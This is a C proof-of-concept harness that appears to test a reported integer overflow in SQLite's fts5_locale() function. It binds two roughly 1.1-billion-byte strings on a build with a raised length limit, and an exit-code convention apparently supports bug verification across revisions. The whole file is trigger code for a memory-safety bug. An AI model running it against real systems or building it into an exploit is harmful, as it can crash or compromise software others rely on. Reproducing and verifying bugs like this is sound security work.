/* PoC harness for FOSSIL-f0dbd9d22f558dd0: fts5_locale() integer overflow.
 * Compiled directly against the target's sqlite3.c amalgamation (unmodified)
 * with SQLITE_MAX_LENGTH raised above the default so two large TEXT values
 * can be bound whose combined length overflows a 32-bit signed int, matching
 * the "oversize SQLITE_MAX_LENGTH build" condition described in the report.
 *
 * It opens an in-memory db, lets the (compiled-in) fts5 extension register
 * its scalar fts5_locale(LOCALE,TEXT) function, then calls it with two large
 * bound strings whose lengths sum to just over INT_MAX.
 *
 * Exit code convention: 0 = ran to completion with no crash/UB (this also
 * covers the case where fts5_locale() is not registered at all, e.g. on a
 * pre-introduction revision where the function/feature does not yet exist --
 * that is a clean, non-buggy outcome, not a harness failure). A nonzero exit
 * from being killed by a signal / sanitizer trap indicates the bug fired.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sqlite3.h"

int main(void) {
    sqlite3 *db = 0;
    sqlite3_stmt *stmt = 0;
    int rc;

    /* Each string individually fits under the (raised) SQLITE_MAX_LENGTH,
     * but nLocale + 1 + nText > INT_MAX (2147483647). */
    sqlite3_int64 nLocale = 1100000000; /* 1.1e9 */
    sqlite3_int64 nText   = 1100000000; /* 1.1e9 */

    fprintf(stderr, "[poc] nLocale=%lld nText=%lld sum=%lld INT_MAX=%d\n",
            (long long)nLocale, (long long)nText,
            (long long)(nLocale + 1 + nText), 2147483647);

    char *zLocale = (char*)malloc((size_t)nLocale);
    char *zText   = (char*)malloc((size_t)nText);
    if (!zLocale || !zText) {
        fprintf(stderr, "[poc] malloc of input buffers failed\n");
        return 2;
    }
    memset(zLocale, 'A', (size_t)nLocale);
    memset(zText, 'B', (size_t)nText);

    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[poc] sqlite3_open failed: %s\n", sqlite3_errmsg(db));
        return 2;
    }

    rc = sqlite3_prepare_v2(db, "SELECT length(fts5_locale(?,?));", -1, &stmt, 0);
    if (rc != SQLITE_OK) {
        /* fts5_locale not registered: e.g. a pre-introduction build that
         * does not have the fts5_locale() feature yet. Clean, no-bug
         * outcome -- exit 0, not an error. */
        fprintf(stderr, "[poc] prepare failed (rc=%d): %s -- "
                "fts5_locale() not present/reachable, nothing to trigger\n",
                rc, sqlite3_errmsg(db));
        sqlite3_close(db);
        return 0;
    }

    rc = sqlite3_bind_text64(stmt, 1, zLocale, nLocale, SQLITE_STATIC, SQLITE_UTF8);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[poc] bind locale failed rc=%d: %s\n", rc, sqlite3_errmsg(db));
        return 4;
    }
    rc = sqlite3_bind_text64(stmt, 2, zText, nText, SQLITE_STATIC, SQLITE_UTF8);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[poc] bind text failed rc=%d: %s\n", rc, sqlite3_errmsg(db));
        return 4;
    }

    rc = sqlite3_step(stmt);
    if (rc == SQLITE_ROW) {
        fprintf(stderr, "[poc] fts5_locale returned length=%lld (no overflow observed)\n",
                (long long)sqlite3_column_int64(stmt, 0));
    } else {
        fprintf(stderr, "[poc] step rc=%d: %s\n", rc, sqlite3_errmsg(db));
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    fprintf(stderr, "[poc] completed without crash\n");
    return 0;
}
